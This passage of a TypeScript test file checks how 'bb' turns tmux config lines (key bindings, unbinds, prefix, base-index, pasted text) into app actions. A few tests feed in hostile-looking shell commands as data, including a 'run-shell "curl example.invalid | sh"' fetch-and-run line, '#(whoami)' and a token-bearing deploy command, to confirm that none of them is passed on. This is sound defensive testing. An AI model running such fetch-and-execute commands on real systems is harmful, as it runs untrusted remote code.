    ["c", "bind c new-window -c #{pane_current_path}"],
    ['"', "bind '\"' split-window -c"],
    ["%", "bind % split-window -h -c"],
    ["n", "bind n next-window -t"],
    ["x", "bind x kill-pane now"],
    ["x", "bind x { kill-pane now }"],
    ["x", "bind x 'kill-pane now'"],
    ["o", "bind -r o select-pane -t"],
  ])("leaves the stock key %s as it is for %j, whose command tmux refuses", (key, line) => {
    const stock = resolveTmuxConfig([]);

    expect(findBinding(stock, "prefix", key)?.actions).not.toEqual([]);
    expect(findBinding(resolve(line), "prefix", key)).toEqual(
      findBinding(stock, "prefix", key),
    );
  });

  it("keeps what an earlier line bound the key to when tmux refuses the command of a later one", () => {
    const config = resolveTmuxConfig([
      { path: HOME_CONFIG, text: "bind -r c split-window -h\nbind -n M-c kill-pane" },
      { path: "the Config text setting", text: "bind c new-window -c\nbind -n M-c kill-pane now" },
    ]);

    expect(findBinding(config, "prefix", "c")).toEqual(
      bound("c", [{ type: "chooser.open", placement: "right" }], true),
    );
    expect(actionsOf(config, "root", "M-c")).toEqual([{ type: "pane.close" }]);
  });

  it("does not bind a key that was not bound before with a command that tmux refuses, and goes on with the next line", () => {
    const config = resolve("bind F5 kill-pane now\nbind F6 kill-pane");

    expect(findBinding(config, "prefix", "F5")).toBeUndefined();
    expect(actionsOf(config, "prefix", "F6")).toEqual([{ type: "pane.close" }]);
  });

  it("binds a key to nothing for a command that bb has no equivalent for, which tmux takes", () => {
    expect(findBinding(resolve("bind c rotate-window"), "prefix", "c")).toEqual(
      bound("c", []),
    );
    expect(findBinding(resolve("bind c kill-pane -a"), "prefix", "c")).toEqual(
      bound("c", []),
    );
  });

  it.each(["split-pane -h", "splitp -h"])(
    "binds a key to %s, an alias that tmux starts with",
    (command) => {
      expect(actionsOf(resolve(`bind | ${command}`), "prefix", "|")).toEqual([
        { type: "chooser.open", placement: "right" },
      ]);
    },
  );
});

describe("the size of the answer", () => {
  const LONG_BINDING = `{ ${Array.from({ length: 5 }, () => "send -X -N 100 page-up").join(" ; ")} }`;
  const letters = [..."abcdefghijklmnopqrstuvwxyz"];
  const keys = [...letters.map((letter) => `M-${letter}`), ...letters.map((letter) => `C-M-${letter}`)];
  const config = resolve(
    keys.map((key) => `bind -n ${key} ${LONG_BINDING}`).join("\n"),
  );
  const actionCount = TABLES.flatMap((table) => config.tables[table]).reduce(
    (count, binding) => count + binding.actions.length,
    0,
  );

  it("takes no more actions than its limit, however many long bindings a config has", () => {
    expect(keysOf(config, "root")).toEqual(keys);
    expect(actionCount).toBeLessThanOrEqual(MAX_TOTAL_ACTIONS);
    expect(actionCount).toBeGreaterThan(MAX_TOTAL_ACTIONS - 500);
  });

  it("gives the stock keys their room first, so that a config that fills the answer leaves them their actions", () => {
    const stockCount = TABLES.flatMap((table) => resolve("").tables[table]).reduce(
      (count, binding) => count + binding.actions.length,
      0,
    );
    const rest = MAX_TOTAL_ACTIONS - stockCount - 39 * 500;
    const full = resolve(
      [
        ...keys.slice(0, 39).map((key) => `bind -n ${key} ${LONG_BINDING}`),
        `bind -n F5 send -X -N ${rest} page-up`,
        "bind -n F6 kill-pane",
        "bind -T copy-mode F7 send -X cancel",
      ].join("\n"),
    );

    expect(actionsOf(full, "root", "F5")).toHaveLength(rest);
    expect(actionsOf(full, "root", "F6")).toEqual([]);
    expect(actionsOf(full, "copyMode", "F7")).toEqual([]);
    for (const table of TABLES) {
      for (const stock of resolve("").tables[table]) {
        expect(findBinding(full, table, stock.key)).toEqual(stock);
      }
    }
  });

  it("writes a repeated command out for the page, action by action", () => {
    const found = resolve("bind -T copy-mode-vi K send -X -N 3 cursor-up");

    expect(actionsOf(found, "copyModeVi", "K")).toEqual([
      { type: "copy.move", motion: "line-up" },
      { type: "copy.move", motion: "line-up" },
      { type: "copy.move", motion: "line-up" },
    ]);
  });

  it("gives the bindings that are over the limit no actions, and leaves the stock keys theirs", () => {
    expect(actionsOf(config, "root", "M-a")).toHaveLength(500);
    expect(actionsOf(config, "root", "C-M-z")).toEqual([]);
    expect(actionsOf(config, "prefix", "c")).toEqual([{ type: "thread.new" }]);
    expect(actionsOf(config, "copyMode", "q")).toEqual([{ type: "copy.exit" }]);
    expect(actionsOf(config, "copyModeVi", "q")).toEqual([{ type: "copy.exit" }]);
  });

  it("gives one key that is bound to more than a binding may hold no actions", () => {
    const many = Array.from({ length: 2000 }, () => "send -X -N 100 page-up");
    const found = resolve(`bind x { ${many.join(" ; ")} }`);

    expect(actionsOf(found, "prefix", "x")).toEqual([]);
    expect(JSON.stringify(found).length).toBeLessThan(
      2 * JSON.stringify(resolveTmuxConfig([])).length,
    );
  });
});

// As in tmux-commands.test.ts: the shortest form of a name that tmux 3.5a
// still takes, and the form with one character less, which it does not.
describe("the shortest form of the names of set-option, set-window-option, bind-key and unbind-key", () => {
  it.each([
    ["set-o -g mouse on", true],
    ["set- -g mouse on", false],
  ])("%j sets the mouse option: %j", (line, isSet) => {
    expect(options(line).mouse).toBe(isSet);
  });

  it.each([
    ["set-w -g mode-keys vi", "vi"],
    ["set- -g mode-keys vi", "emacs"],
  ])("%j leaves mode-keys at %s", (line, modeKeys) => {
    expect(options(line).modeKeys).toBe(modeKeys);
  });

  it.each([
    ["bi g kill-pane", [{ type: "pane.close" }]],
    ["b g kill-pane", undefined],
  ])("%j binds g: %j", (line, actions) => {
    expect(actionsOf(resolve(line), "prefix", "g")).toEqual(actions);
  });

  it.each([
    ["unb c", undefined],
    ["un c", [{ type: "thread.new" }]],
  ])("%j leaves c bound to %j", (line, actions) => {
    expect(actionsOf(resolve(line), "prefix", "c")).toEqual(actions);
  });
});

describe("unbind-key", () => {
  it.each([
    "unbind c",
    "unbind-key c",
    "unb c",
    "unbind -T prefix c",
    "unbind -q c",
    "unbind -- c",
  ])(
    "removes a key after the prefix with %j",
    (text) => {
      const config = resolve(text);

      expect(findBinding(config, "prefix", "c")).toBeUndefined();
      expect(config.tables.prefix).toHaveLength(86);
    },
  );

  it("removes a key without the prefix with -n or -T root", () => {
    const bindings = "bind -n M-h select-pane -L\nbind -n M-l select-pane -R\n";

    expect(keysOf(resolve(`${bindings}unbind -n M-h`), "root")).toEqual(["M-l"]);
    expect(keysOf(resolve(`${bindings}unbind -T root M-l`), "root")).toEqual(["M-h"]);
    expect(keysOf(resolve(`${bindings}unbind M-h`), "root")).toEqual(["M-h", "M-l"]);
  });

  it("removes a key from one copy table and leaves the other", () => {
    const config = resolve("unbind -T copy-mode-vi Enter\nunbind -Tcopy-mode C-w");

    expect(findBinding(config, "copyModeVi", "Enter")).toBeUndefined();
    expect(findBinding(config, "copyMode", "C-w")).toBeUndefined();
    expect(actionsOf(config, "copyModeVi", "q")).toEqual(EXIT);
    expect(config.tables.copyModeVi).toHaveLength(79);
    expect(config.tables.copyMode).toHaveLength(64);
    expect(config.tables.prefix).toHaveLength(87);
  });

  it("removes every key of the prefix table with -a, and of no other table", () => {
    const config = resolve("unbind -a");

    expect(config.tables.prefix).toEqual([]);
    expect(config.tables.copyMode).toHaveLength(65);
    expect(config.tables.copyModeVi).toHaveLength(80);
  });

  it.each([
    ["unbind -a -T copy-mode-vi", "copyModeVi"],
    ["unbind -aT copy-mode", "copyMode"],
    ["unbind -aq -T prefix", "prefix"],
    ["unbind-key -a", "prefix"],
  ] as const)("removes every key of one table with %j", (text, table) => {
    const config = resolve(`bind -n M-h select-pane -L\n${text}`);

    for (const name of TABLES) {
      const isEmpty = config.tables[name].length === 0;
      expect(isEmpty).toBe(name === table);
    }
  });

  it("removes every key that is bound without the prefix with -an", () => {
    const config = resolve("bind -n M-h select-pane -L\nunbind -an");

    expect(config.tables.root).toEqual([]);
    expect(config.tables.prefix).toHaveLength(87);
  });

  it("keeps the keys that are bound after an unbind -a", () => {
    const config = resolve("unbind -a\nbind c new-window\nbind x kill-pane");

    expect(config.tables.prefix).toEqual([
      bound("c", [{ type: "thread.new" }]),
      bound("x", [{ type: "pane.close" }]),
    ]);
  });

  it.each([
    "unbind",
    "unbind -a c",
    "unbind -x c",
    "unbind c n",
    "unbind -T resize h",
    "unbind -a -T resize",
    "unbind -T",
    "unbind G",
    "unbind MouseDown1Pane",
    "unbind $KEY",
    "unbind -T copy-mode-vi c",
  ])("changes nothing with %j", (text) => {
    expect(resolve(text)).toEqual(resolveTmuxConfig([]));
  });

  it("lets a key be bound again after it was removed", () => {
    const config = resolve("unbind c\nbind c split-window -h");

    expect(actionsOf(config, "prefix", "c")).toEqual(SPLIT_RIGHT);
  });
});

describe("a config that changes stock keys", () => {
  it("moves the prefix to C-a and sends it on with C-a", () => {
    const config = resolve(
      ["unbind C-b", "set -g prefix C-a", "bind C-a send-prefix"].join("\n"),
    );

    expect(config.options.prefix).toEqual({
      key: "C-a",
      path: HOME_CONFIG,
      usable: true,
    });
    expect(findBinding(config, "prefix", "C-b")).toBeUndefined();
    expect(actionsOf(config, "prefix", "C-a")).toEqual([
      { type: "prefix.send", second: false },
    ]);
  });

  it("passes the prefix on with no key when the config unbinds C-b and binds no other", () => {
    const config = resolve("unbind C-b\nset -g prefix C-a");
    const sends = config.tables.prefix.filter((binding) =>
      binding.actions.some((action) => action.type === "prefix.send"),
    );

    expect(sends).toEqual([]);
  });

  it("sends the second prefix with send-prefix -2", () => {
    const config = resolve("set -g prefix2 C-s\nbind C-s send-prefix -2");

    expect(actionsOf(config, "prefix", "C-s")).toEqual([
      { type: "prefix.send", second: true },
    ]);
  });

  it("moves the splits to | and -", () => {
    const config = resolve(
      [
        "unbind %",
        "unbind '\"'",
        'bind | split-window -h -c "#{pane_current_path}"',
        'bind - split-window -v -c "#{pane_current_path}"',
      ].join("\n"),
    );

    expect(findBinding(config, "prefix", "%")).toBeUndefined();
    expect(findBinding(config, "prefix", '"')).toBeUndefined();
    expect(actionsOf(config, "prefix", "|")).toEqual(SPLIT_RIGHT);
    expect(actionsOf(config, "prefix", "-")).toEqual(SPLIT_DOWN);
  });

  it("puts the pane keys on letters, and l no longer goes to the last thread", () => {
    const config = resolve(
      [
        "bind h select-pane -L",
        "bind j select-pane -D",
        "bind k select-pane -U",
        "bind l select-pane -R",
      ].join("\n"),
    );

    expect(actionsOf(config, "prefix", "h")).toEqual(focus("left"));
    expect(actionsOf(config, "prefix", "j")).toEqual(focus("down"));
    expect(actionsOf(config, "prefix", "k")).toEqual(focus("up"));
    expect(actionsOf(config, "prefix", "l")).toEqual(focus("right"));
    expect(findBinding(config, "prefix", "l")?.repeat).toBe(false);
    expect(actionsOf(config, "prefix", "ArrowLeft")).toEqual(focus("left"));
  });

  it("puts the resize keys on letters that repeat", () => {
    const config = resolve(
      [
        "bind -r H resize-pane -L 5",
        "bind -r J resize-pane -D 5",
        "bind -r K resize-pane -U 5",
        "bind -r L resize-pane -R 5",
        "bind -r M-h resize-pane -L",
      ].join("\n"),
    );

    expect(findBinding(config, "prefix", "H")).toEqual(
      bound("H", resize("left", 5), true),
    );
    expect(findBinding(config, "prefix", "J")).toEqual(
      bound("J", resize("down", 5), true),
    );
    expect(findBinding(config, "prefix", "K")).toEqual(
      bound("K", resize("up", 5), true),
    );
    expect(findBinding(config, "prefix", "L")).toEqual(
      bound("L", resize("right", 5), true),
    );
    expect(findBinding(config, "prefix", "M-h")).toEqual(
      bound("M-h", resize("left", 1), true),
    );
  });

  it("binds the vi copy keys again: v selects, y copies and leaves, Escape leaves", () => {
    const config = resolve(
      [
        "setw -g mode-keys vi",
        "bind -T copy-mode-vi v send-keys -X begin-selection",
        'bind -T copy-mode-vi y send-keys -X copy-pipe-and-cancel "reattach-to-user-namespace pbcopy"',
        "bind -T copy-mode-vi Escape send-keys -X cancel",
      ].join("\n"),
    );

    expect(config.options.modeKeys).toBe("vi");
    expect(actionsOf(config, "copyModeVi", "v")).toEqual(BEGIN);
    expect(actionsOf(config, "copyModeVi", "y")).toEqual(yank("exit"));
    expect(actionsOf(config, "copyModeVi", "Escape")).toEqual(EXIT);
    expect(actionsOf(config, "copyModeVi", "Space")).toEqual(BEGIN);
    expect(actionsOf(config, "copyMode", "Escape")).toEqual(EXIT);
    expect(findBinding(config, "copyMode", "y")).toBeUndefined();
  });

  it("reloads the config and says so with one key, written as a sequence or in braces", () => {
    const expected: TmuxAction[] = [
      { type: "config.reload" },
      { type: "notice.show", text: "Reloaded!" },
    ];
    const sequence = resolve('bind r source-file ~/.tmux.conf \\; display "Reloaded!"');
    const braces = resolve('bind r {\n  source-file ~/.tmux.conf\n  display "Reloaded!"\n}');
    const quoted = resolve("bind r 'source-file ~/.tmux.conf ; display Reloaded!'");

    expect(actionsOf(sequence, "prefix", "r")).toEqual(expected);
    expect(actionsOf(braces, "prefix", "r")).toEqual(expected);
    expect(actionsOf(quoted, "prefix", "r")).toEqual(expected);
  });

  it("goes on with the lines after a brace body", () => {
    const config = resolve("bind x {\n  kill-pane\n}\nbind X resize-pane -Z");

    expect(actionsOf(config, "prefix", "x")).toEqual([{ type: "pane.close" }]);
    expect(actionsOf(config, "prefix", "X")).toEqual([{ type: "pane.zoom" }]);
  });

  it("binds a pane command in a copy table and a copy command after the prefix", () => {
    const config = resolve(
      "bind -T copy-mode-vi C-h select-pane -L\nbind v copy-mode \\; send -X begin-selection",
    );

    expect(actionsOf(config, "copyModeVi", "C-h")).toEqual(focus("left"));
    expect(actionsOf(config, "prefix", "v")).toEqual([
      { type: "copy.enter", motion: null },
      { type: "copy.beginSelection" },
    ]);
  });
});

describe("base-index and the keys that jump to a thread", () => {
  it("counts the threads from 0, as tmux counts its windows", () => {
    const stock = resolveTmuxConfig([]);

    expect(actionsOf(stock, "prefix", "0")).toEqual(jump(1));
    expect(actionsOf(stock, "prefix", "9")).toEqual(jump(10));
  });

  it("counts the threads from 1 with base-index 1, and has no thread for 0", () => {
    const config = resolve("set -g base-index 1");

    expect(actionsOf(config, "prefix", "1")).toEqual(jump(1));
    expect(actionsOf(config, "prefix", "9")).toEqual(jump(9));
    expect(actionsOf(config, "prefix", "0")).toEqual([]);
  });

  it("uses the base index that stands at the end, also for a key bound before it", () => {
    const config = resolve(
      "bind F1 select-window -t :=3\nset -g base-index 1\nset -g base-index 2",
    );

    expect(actionsOf(config, "prefix", "F1")).toEqual(jump(2));
    expect(actionsOf(config, "prefix", "2")).toEqual(jump(1));
    expect(actionsOf(config, "prefix", "1")).toEqual([]);
  });

  it("jumps to the first thread for tmux's lowest window and to the last one for its highest, whatever base-index says", () => {
    const lines = [
      "bind F1 select-window -t ^",
      "bind F2 select-window -t '{start}' \\; display first",
      "bind F3 select-window -t ':$'",
      "bind F4 select-window -t '{end}' \\; display last",
    ];

    for (const baseIndex of [0, 1, 7]) {
      const config = resolve([...lines, `set -g base-index ${baseIndex}`].join("\n"));

      expect(actionsOf(config, "prefix", "F1")).toEqual(jump(1));
      expect(actionsOf(config, "prefix", "F2")).toEqual([
        ...jump(1),
        { type: "notice.show", text: "first" },
      ]);
      expect(actionsOf(config, "prefix", "F3")).toEqual([{ type: "thread.end" }]);
      expect(actionsOf(config, "prefix", "F4")).toEqual([
        { type: "thread.end" },
        { type: "notice.show", text: "last" },
      ]);
    }
  });

  // tmux parses a command that is given as one string once more, and its
  // lexer refuses a "$" that such a text ends with (yylex_token_variable in
  // cmd-parse.y).
  it.each(["bind F5 'select-window -t :$'", 'bind F5 "select-window -t :$"'])(
    "gives no action to the key of %s, whose command text ends in a $ that tmux refuses",
    (line) => {
      expect(actionsOf(resolve(line), "prefix", "F5")).toEqual([]);
    },
  );

  it("jumps to the last thread where something stands behind the $ of the command text, or the command is not one string", () => {
    for (const line of [
      "bind F5 'select-window -t :$ '",
      "bind F5 select-window -t :$\n",
      "bind F5 select-window -t :$ \\; display last",
      "bind F5 { select-window -t :$ }",
    ]) {
      expect(actionsOf(resolve(line), "prefix", "F5")?.[0]).toEqual({ type: "thread.end" });
    }
  });

  it("skips a line whose $ ends a file that has no line break at its end, and keeps the binding from before", () => {
    const config = resolve("bind g kill-pane\nbind c select-window -t :$");

    expect(actionsOf(config, "prefix", "c")).toEqual([{ type: "thread.new" }]);
    expect(actionsOf(config, "prefix", "g")).toEqual([{ type: "pane.close" }]);
  });

  it("ends the commands of a key at a window that does not exist, which is an error in tmux", () => {
    const config = resolve(
      [
        "set -g base-index 1",
        "bind 0 select-window -t :=0 \\; display none",
        "bind 5 display five \\; select-window -t :=0 \\; kill-pane",
        "bind 6 select-window -t :=1 \\; display one",
      ].join("\n"),
    );

    expect(actionsOf(config, "prefix", "0")).toEqual([]);
    expect(actionsOf(config, "prefix", "5")).toEqual([
      { type: "notice.show", text: "five" },
    ]);
    expect(actionsOf(config, "prefix", "6")).toEqual([
      ...jump(1),
      { type: "notice.show", text: "one" },
    ]);
  });
});

describe("several files", () => {
  it("runs them in their order as one sequence", () => {
    const config = resolveTmuxConfig([
      {
        path: HOME_CONFIG,
        text: "set -g prefix C-a\nset -g mouse on\nbind g kill-pane\nunbind c",
      },
      {
        path: XDG_CONFIG,
        text: "set -g prefix C-s\nbind g resize-pane -Z\nbind c split-window\nunbind n",
      },
    ]);

    expect(config.options.prefix).toEqual({
      key: "C-s",
      path: XDG_CONFIG,
      usable: true,
    });
    expect(config.options.mouse).toBe(true);
    expect(actionsOf(config, "prefix", "g")).toEqual([{ type: "pane.zoom" }]);
    expect(actionsOf(config, "prefix", "c")).toEqual(SPLIT_DOWN);
    expect(findBinding(config, "prefix", "n")).toBeUndefined();
  });

  it("does not carry an open brace or an open condition from one file into the next", () => {
    const config = resolveTmuxConfig([
      { path: HOME_CONFIG, text: "bind x {\n  kill-pane" },
      { path: XDG_CONFIG, text: "%if 1\nbind y kill-pane" },
      { path: "third", text: "bind g kill-pane" },
    ]);

    expect(actionsOf(config, "prefix", "g")).toEqual([{ type: "pane.close" }]);
    expect(findBinding(config, "prefix", "y")).toBeUndefined();
  });

  it("gives the same keymap for one file as for its lines in two", () => {
    const first = "unbind C-b\nset -g prefix C-a\nbind C-a send-prefix";
    const second = "setw -g mode-keys vi\nbind -T copy-mode-vi v send -X begin-selection";
    const one = resolveTmuxConfig([{ path: HOME_CONFIG, text: `${first}\n${second}` }]);
    const two = resolveTmuxConfig([
      { path: HOME_CONFIG, text: first },
      { path: HOME_CONFIG, text: second },
    ]);

    expect(two).toEqual(one);
  });
});

describe("tmuxConfigFrom", () => {
  const TEXT = [
    "set -g prefix C-a",
    "bind g rotate-window",
    "bind G kill-pane",
    "bind -n M-x if-shell true 'kill-pane'",
    "bind -n M-h select-pane -L",
    "bind -T copy-mode-vi y send -X copy-pipe-and-cancel pbcopy",
    "bind -T copy-mode-vi Y send -X copy-line",
  ].join("\n");

  it("lists every key that is bound, with no action for a command bb has no equivalent for", () => {
    const files = [{ path: HOME_CONFIG, text: TEXT }];
    const config = tmuxConfigFrom(fileSources(files), NO_EDITOR);

    expect(keysOf(config, "root")).toEqual(["M-x", "M-h"]);
    expect(findBinding(config, "root", "M-x")?.actions).toEqual([]);
    expect(findBinding(config, "prefix", "G")?.actions).toEqual([{ type: "pane.close" }]);
    expect(findBinding(config, "prefix", "g")?.actions).toEqual([]);
    expect(findBinding(config, "copyModeVi", "y")?.actions).toEqual(yank("exit"));
    expect(findBinding(config, "copyModeVi", "Y")?.actions).toEqual([]);
    for (const table of TABLES) {
      expect(config.tables[table]).toEqual(resolveTmuxConfig(files).tables[table]);
    }
  });

  it("names the files in their order, and says whether one could not be read", () => {
    const files = [
      { path: HOME_CONFIG, text: "set -g mouse on" },
      { path: XDG_CONFIG, text: "" },
    ];

    expect(tmuxConfigFrom(fileSources(files), NO_EDITOR)).toMatchObject({
      files: [HOME_CONFIG, XDG_CONFIG],
      unreadable: false,
    });
    expect(tmuxConfigFrom(fileSources([], true), NO_EDITOR)).toMatchObject({
      files: [],
      unreadable: true,
    });
  });

  it("takes mode-keys from the editor it is given", () => {
    const config = tmuxConfigFrom(fileSources([]), {
      visual: undefined,
      editor: "vim",
    });

    expect(config.options.modeKeys).toBe("vi");
  });

  it("is plain data that survives JSON as it is", () => {
    const config = tmuxConfigFrom(
      fileSources([{ path: HOME_CONFIG, text: TEXT }], true),
      NO_EDITOR,
    );

    expect(JSON.parse(JSON.stringify(config))).toEqual(config);
  });

  describe("with a chosen config file and the Config text setting", () => {
    const PASTED = "the Config text setting";
    const FILE = { path: HOME_CONFIG, text: "set -g prefix C-a\nbind g kill-pane\n" };

    function pasted(text: string) {
      return { state: "applied", lines: { path: PASTED, text } } as const;
    }

    it("applies the pasted lines after the files, so that a later line wins", () => {
      const config = tmuxConfigFrom(
        {
          ...fileSources([FILE]),
          pastedText: pasted("bind g resize-pane -Z\nbind G kill-pane\n"),
        },
        NO_EDITOR,
      );

      expect(findBinding(config, "prefix", "g")?.actions).toEqual([
        { type: "pane.zoom" },
      ]);
      expect(findBinding(config, "prefix", "G")?.actions).toEqual([
        { type: "pane.close" },
      ]);
      expect(config.options.prefix).toEqual({
        key: "C-a",
        path: HOME_CONFIG,
        usable: true,
      });
    });

    it("reports a prefix that the pasted lines set under the name of the setting", () => {
      const config = tmuxConfigFrom(
        { ...fileSources([FILE]), pastedText: pasted("set -g prefix C-s") },
        NO_EDITOR,
      );

      expect(config.options.prefix).toEqual({
        key: "C-s",
        path: PASTED,
        usable: true,
      });
    });

    it("lets the pasted lines unbind a key of a file and a stock key", () => {
      const config = tmuxConfigFrom(
        { ...fileSources([FILE]), pastedText: pasted("unbind g\nunbind c\n") },
        NO_EDITOR,
      );

      expect(findBinding(config, "prefix", "g")).toBeUndefined();
      expect(findBinding(config, "prefix", "c")).toBeUndefined();
    });

    it("says that the pasted lines were applied, and does not list them as a file", () => {
      const config = tmuxConfigFrom(
        { ...fileSources([FILE]), pastedText: pasted("set -g mouse on") },
        NO_EDITOR,
      );

      expect(config).toMatchObject({
        files: [HOME_CONFIG],
        unreadable: false,
        namedFile: false,
        pastedText: "applied",
      });
      expect(config.options.mouse).toBe(true);
    });

    it("applies the pasted lines to stock tmux when there is no file", () => {
      const config = tmuxConfigFrom(
        { ...fileSources([]), pastedText: pasted("bind g kill-pane") },
        NO_EDITOR,
      );

      expect(config.files).toEqual([]);
      expect(findBinding(config, "prefix", "g")?.actions).toEqual([
        { type: "pane.close" },
      ]);
      expect(findBinding(config, "prefix", "c")?.actions).toEqual([
        { type: "thread.new" },
      ]);
    });

    it.each(["none", "unreadable"] as const)(
      "applies only the files when the pasted text is %s, and says which it is",
      (state) => {
        const config = tmuxConfigFrom(
          { ...fileSources([FILE]), pastedText: { state } },
          NO_EDITOR,
        );

        expect(config.pastedText).toBe(state);
        expect(config.tables).toEqual(
          tmuxConfigFrom(fileSources([FILE]), NO_EDITOR).tables,
        );
      },
    );

    it("says that the file is the one a setting names, read or not", () => {
      const read = { ...fileSources([FILE]), namedFile: true };
      const notRead = { ...fileSources([], true), namedFile: true };

      expect(tmuxConfigFrom(read, NO_EDITOR)).toMatchObject({
        files: [HOME_CONFIG],
        unreadable: false,
        namedFile: true,
      });
      expect(tmuxConfigFrom(notRead, NO_EDITOR)).toMatchObject({
        files: [],
        unreadable: true,
        namedFile: true,
      });
    });

    it("hands on neither the pasted lines nor a shell command in them", () => {
      const text = [
        "bind g kill-pane",
        'bind P run-shell "curl example.invalid | sh"',
        "set -g status-right '#(whoami)'",
      ].join("\n");
      const json = JSON.stringify(
        tmuxConfigFrom({ ...fileSources([]), pastedText: pasted(text) }, NO_EDITOR),
      );

      for (const secret of ["run-shell", "curl", "whoami", "kill-pane", "status-right"]) {
        expect(json).not.toContain(secret);
      }
    });
  });

  it.each(['"', "'"])(
    "hands on nothing of the lines that a %s without a partner takes in",
    (quote) => {
      const lines = [
        `bind r display ${quote}Reloaded`,
        "bind y run-shell 'deploy --token hunter2'",
        "set -g prefix C-a",
      ].join("\n");
      const config = tmuxConfigFrom(
        {
          ...fileSources([]),
          pastedText: { state: "applied", lines: { path: "the lines", text: lines } },
        },
        NO_EDITOR,
      );

      expect(JSON.stringify(config)).not.toContain("hunter2");
      expect(JSON.stringify(config)).not.toContain("Reloaded");
      expect(config.tables).toEqual(resolveTmuxConfig([]).tables);
      expect(config.options.prefix).toBeNull();
    },
  );

  it("hands on nothing of a command that bb has no equivalent for, and no shell command", () => {
    const text = [
      TEXT,
      'bind -T copy-mode-vi Enter send-keys -X copy-pipe-and-cancel "xclip -in -selection clipboard"',
      'bind C-l send-keys C-l \\; run-shell "clear-history-script"',
      'bind e if-shell "test -f ~/.secret" "display yes" "display no"',
      'bind P run-shell "curl example.invalid | sh"',
      "bind u switch-client -T secret-table",
      "set -g default-command 'reattach-to-user-namespace -l zsh'",
      "set -g status-right '#(whoami)'",
    ].join("\n");
    const json = JSON.stringify(
      tmuxConfigFrom(fileSources([{ path: HOME_CONFIG, text }]), NO_EDITOR),
    );

    for (const secret of [
      "pbcopy",
      "xclip",
      "clipboard",
      "run-shell",
      "if-shell",
      "send-keys",
      "clear-history-script",
      "secret",
      "curl",
      "rotate-window",
      "switch-client",
      "copy-pipe",
      "copy-line",
      "reattach",
      "whoami",
      "zsh",
      "yes",
    ]) {
      expect(json).not.toContain(secret);
    }
  });
});
